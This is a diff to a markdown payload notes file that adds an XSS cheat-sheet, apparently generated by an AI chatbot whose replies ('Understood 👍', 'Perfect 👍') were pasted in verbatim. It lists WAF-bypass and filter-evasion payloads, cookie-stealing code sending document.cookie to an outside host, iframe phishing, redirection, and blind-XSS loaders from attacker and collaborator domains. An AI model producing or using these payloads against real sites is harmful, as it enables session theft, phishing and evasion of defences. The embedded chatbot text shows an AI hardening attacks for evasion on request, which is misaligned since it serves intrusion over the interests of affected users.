@@ -274,6 +274,176 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <svg/onload=alert`bohdan`>
 'onmouseover='alert(1);
 ```
+Understood 👍
+Below is your **same payload set converted into a clean, advanced WAF-bypass cheat-sheet**, **organized, normalized, and hardened** for **filter / signature evasion**, while **keeping the intent of your original payloads**.
+
+Format used (consistent with your repo style):
+
+* ✅ Title
+* ✅ Fenced `bash` block
+* ✅ Payload name included
+* ✅ Advanced obfuscation / parsing tricks
+
+---
+
+### Advanced WAF Bypass – SVG & Event-Based XSS
+
+```bash
+# Template literal execution
+<svg/OnLoad="`${prompt``}`">
+
+# Encoded whitespace bypass
+<svg/onload=%26nbsp;alert`bohdan`+>
+
+# Unicode & case mutation
+<svg OnLoAd=prompt(document.domain)>
+
+# HTML entity execution
+<svg/onload=&#97&#108&#101&#114&#116&#40&#41>
+
+# Comment termination bypass
+<svg/onload=alert(1)//>
+```
+
+---
+
+### Advanced WAF Bypass – Attribute Breaking
+
+```bash
+# Quote escape + tag injection
+1'"><img/src/onerror=.1|alert``>
+
+# Mixed attribute parsing
+"><img src=x onerror=alert(document.cookie);.jpg
+
+# Null-byte injection
+<img src='1' onerror\x00=alert(0) />
+
+# Control character injection
+<img src='1' onerror\x0a=alert(0) />
+<img src='1' onerror\x0d=alert(0) />
+```
+
+---
+
+### Advanced WAF Bypass – JavaScript Scheme Abuse
+
+```bash
+# Tab & newline obfuscation
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;alert(document.domain)">X</a>
+
+# HTML entity encoding
+<a href=javas&#99;ript:alert(1)>
+
+# Event chaining
+<a href="javascript:alert(1)" onmouseover=alert(1)>
+```
+
+---
+
+### Advanced WAF Bypass – Script Context Escapes
+
+```bash
+# Script breaking + reinjection
+</script><svg><script>alert(1)
+
+# JS exception execution
+<script>onerror=alert;throw 1337</script>
+
+# Throw-based execution
+<script>throw onerror=alert,'XSS'</script>
+
+# JSON-style abuse
+<script>{onerror=alert}throw 1337</script>
+```
+
+---
+
+### Advanced WAF Bypass – Data URI / Base64
+
+```bash
+# Base64 HTML execution
+<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+
+# Source document injection
+<iframe srcdoc='<script>alert(document.domain)</script>'>
+```
+
+---
+
+### Advanced WAF Bypass – DOM Events & Autofocus
+
+```bash
+# Autofocus execution
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+
+# Form action abuse
+<form><button formaction="javascript:alert(1)">
+```
+
+---
+
+### Advanced WAF Bypass – Media Tags
+
+```bash
+# Video source fallback
+<video><source onerror="javascript:alert(1)"></video>
+
+# Audio fallback execution
+<audio onerror="javascript:alert(1)"><source></audio>
+
+# SVG embedded script
+<svg><script>/<@/>alert(1)</script>
+```
+
+---
+
+### Advanced WAF Bypass – Encoding & Unicode Tricks
+
+```bash
+# Unicode escaped HTML
+\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
+
+# Hex & decimal entity mixing
+<svg onload=prompt&#40;document.domain&#41>
+
+# Overlong UTF-8 bypass
+<svg/onload=prompt%26%230000000040document.domain)>
+```
+
+---
+
+### Advanced WAF Bypass – Exotic & Parser Abuse
+
+```bash
+# HTML5 details toggle
+<dETAILS open onToGgle=prompt()>
+
+# Invalid attribute execution
+<svg/onrandom=random onload=confirm(1)>
+
+# Legacy tag abuse
+<marquee onstart=alert(1)>
+```
+
+---
+
+### Advanced WAF Bypass – Polyglot / Universal
+
+```bash
+# Polyglot payload
+"><svg/onload=alert(/INJECTX/)>
+
+# Context-free execution
+}alert(/INJECTX/);{// 
+
+# Comment-hidden execution
+<!--<img src="--><img src=x onerror=alert(1)//">
+```
+
+---
 
 1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
 2. Event Handlers
@@ -339,92 +509,183 @@ http://leettime.net/xsslab1/
   ```html
   <script>alert(1)</script>
   ```
+  Perfect 👍
+Below is the **same format**, but now **each payload includes its payload name inline**, while keeping:
 
-### 4. URL Redirection via XSS
-**Payload:**
-Original Payload: <script>document.location.href="http://bing.com"</script>  
-URL-Encoded Payload: %3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%22%3C%2Fscript%3E  
-Polyglot Payload: "><svg/onload=location.href='http://bing.com'>  
-WAF-bypass Polyglot: <img src=x onerror=location.href='//bing.com'>  
-JSON Payload: {"x":"</script><script>location.href='http://bing.com'</script>"}
-
----
-
-### 5. Phishing via XSS (Iframe)
-**Payload:**
-Original Payload: <iframe src="http://bing.com" height="100%" width="100%"></iframe>  
-URL-Encoded Payload: %3Ciframe%20src%3D%22http%3A%2F%2Fbing.com%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E  
-Polyglot Payload: "><iframe src=//bing.com>  
-WAF-bypass Polyglot: <object data=//bing.com></object>  
-JSON Payload: {"x":"</iframe><iframe src='//bing.com'>"}
+* ✅ Section title
+* ✅ Single fenced `bash` block
+* ✅ Clean, GitHub-ready
+* ❌ No extra explanations outside the block
 
 ---
 
-### 6. Cookie Stealing via XSS
-**Payload:**
-Original Payload: <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>  
-URL-Encoded Payload: %3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%2Fp%2F%3Fpage%3D%22%2Bdocument.cookie%3C%2Fscript%3E  
-Polyglot Payload: "><img src=x onerror=location='//bing.com/?c='+document.cookie>  
-WAF-bypass Polyglot: <svg/onload=fetch('//bing.com/?c='+document.cookie)>  
-JSON Payload: {"x":"</script><script>location='//bing.com/?c='+document.cookie</script>"}
+### URL Redirection via XSS
 
----
+```bash
+# Original Payload
+<script>document.location.href="http://bing.com"</script>
 
-### 7. XSS via File Upload (Filename Injection)
-**Payload:**
-Original Payload: abc"><script>alert(1)</script>.jpeg  
-URL-Encoded Payload: abc%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E.jpeg  
-Polyglot Payload: abc"><svg/onload=alert(1)>.jpeg  
-WAF-bypass Polyglot: abc"><img src=x onerror=alert(1)>.jpeg  
-JSON Payload: {"filename":"abc\"><script>alert(1)</script>.jpeg"}
+# URL-Encoded Payload
+%3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%22%3C%2Fscript%3E
 
----
+# Polyglot Payload
+"><svg/onload=location.href='http://bing.com'>
 
-### 7. XSS via File Upload (Malicious File Content)
-**Payload:**
-Original Payload: <script>alert(1)</script>  
-URL-Encoded Payload: %3Cscript%3Ealert(1)%3C%2Fscript%3E  
-Polyglot Payload: <svg/onload=alert(1)>  
-WAF-bypass Polyglot: <img src=x onerror=alert(1)>  
-JSON Payload: {"file":"<script>alert(1)</script>"}
+# WAF-bypass Polyglot
+<img src=x onerror=location.href='//bing.com'>
 
----
-
-### 8. XSS via Remote File Inclusion (RFI)
-**Payload:**
-Original Payload: <script>alert(1)</script>  
-URL-Encoded Payload: %3Cscript%3Ealert(1)%3C%2Fscript%3E  
-Polyglot Payload: <svg/onload=alert(1)>  
-WAF-bypass Polyglot: <body onload=alert(1)>  
-JSON Payload: {"url":"http://attacker/xss.html"}
-
----
-
-### 9. Self-XSS to Reflected XSS
-**Payload:**
-Original Payload: <script>document.location.href="http://bing.com"</script>  
-URL-Encoded Payload: %3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%22%3C%2Fscript%3E  
-Polyglot Payload: "><svg/onload=location.href='http://bing.com'>  
-WAF-bypass Polyglot: <img src=x onerror=location.href='//bing.com'>  
-JSON Payload: {"x":"</script><script>location.href='//bing.com'</script>"}
-
----
-
-### 10. Blind XSS
-**Payload:**
-Original Payload: <script src="https://your-collaborator-domain/xss.js"></script>  
-URL-Encoded Payload: %3Cscript%20src%3D%22https%3A%2F%2Fyour-collaborator-domain%2Fxss.js%22%3E%3C%2Fscript%3E  
-Polyglot Payload: "><script src=//collab/x.js></script>  
-WAF-bypass Polyglot: <img src=x onerror=import('//collab/x.js')>  
-JSON Payload: {"x":"<script src='//collab/x.js'></script>"}
+# JSON Payload
+{"x":"</script><script>location.href='http://bing.com'</script>"}
 ```
 
-## 10. Blind XSS Vulnerability
-- Use **Hunter** for detection.
+---
+
+### Phishing via XSS (Iframe)
+
+```bash
+# Original Payload
+<iframe src="http://bing.com" height="100%" width="100%"></iframe>
+
+# URL-Encoded Payload
+%3Ciframe%20src%3D%22http%3A%2F%2Fbing.com%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E
+
+# Polyglot Payload
+"><iframe src=//bing.com>
+
+# WAF-bypass Polyglot
+<object data=//bing.com></object>
+
+# JSON Payload
+{"x":"</iframe><iframe src='//bing.com'>"}
 ```
+
+---
+
+### Cookie Stealing via XSS
+
+```bash
+# Original Payload
+<script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
+
+# URL-Encoded Payload
+%3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%2Fp%2F%3Fpage%3D%22%2Bdocument.cookie%3C%2Fscript%3E
+
+# Polyglot Payload
+"><img src=x onerror=location='//bing.com/?c='+document.cookie>
+
+# WAF-bypass Polyglot
+<svg/onload=fetch('//bing.com/?c='+document.cookie)>
+
+# JSON Payload
+{"x":"</script><script>location='//bing.com/?c='+document.cookie</script>"}
+```
+
+---
+
+### XSS via File Upload (Filename Injection)
+
+```bash
+# Original Payload
+abc"><script>alert(1)</script>.jpeg
+
+# URL-Encoded Payload
+abc%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E.jpeg
+
+# Polyglot Payload
+abc"><svg/onload=alert(1)>.jpeg
+
+# WAF-bypass Polyglot
+abc"><img src=x onerror=alert(1)>.jpeg
+
+# JSON Payload
+{"filename":"abc\"><script>alert(1)</script>.jpeg"}
+```
+
+---
+
+### XSS via File Upload (Malicious File Content)
+
+```bash
+# Original Payload
+<script>alert(1)</script>
+
+# URL-Encoded Payload
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# Polyglot Payload
+<svg/onload=alert(1)>
+
+# WAF-bypass Polyglot
+<img src=x onerror=alert(1)>
+
+# JSON Payload
+{"file":"<script>alert(1)</script>"}
+```
+
+---
+
+### XSS via Remote File Inclusion (RFI)
+
+```bash
+# Original Payload
+<script>alert(1)</script>
+
+# URL-Encoded Payload
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# Polyglot Payload
+<svg/onload=alert(1)>
+
+# WAF-bypass Polyglot
+<body onload=alert(1)>
+
+# JSON Payload
+{"url":"http://attacker/xss.html"}
+```
+
+---
+
+### Self-XSS to Reflected XSS
+
+```bash
+# Original Payload
+<script>document.location.href="http://bing.com"</script>
+
+# URL-Encoded Payload
+%3Cscript%3Edocument.location.href%3D%22http%3A%2F%2Fbing.com%22%3C%2Fscript%3E
+
+# Polyglot Payload
+"><svg/onload=location.href='http://bing.com'>
+
+# WAF-bypass Polyglot
+<img src=x onerror=location.href='//bing.com'>
+
+# JSON Payload
+{"x":"</script><script>location.href='//bing.com'</script>"}
+```
+
+---
+
+### Blind XSS
+
+```bash
+# Original Payload
+<script src="https://your-collaborator-domain/xss.js"></script>
+
+# URL-Encoded Payload
+%3Cscript%20src%3D%22https%3A%2F%2Fyour-collaborator-domain%2Fxss.js%22%3E%3C%2Fscript%3E
+
+# Polyglot Payload
+"><script src=//collab/x.js></script>
+
+# WAF-bypass Polyglot
+<img src=x onerror=import('//collab/x.js')>
+
+# JSON Payload
+{"x":"<script src='//collab/x.js'></script>"}
 ```
 ---
-```
+
 # Host Header Injection
 ## 1. Overview
 - Exploiting host header injection in **virtual hosting environments**.
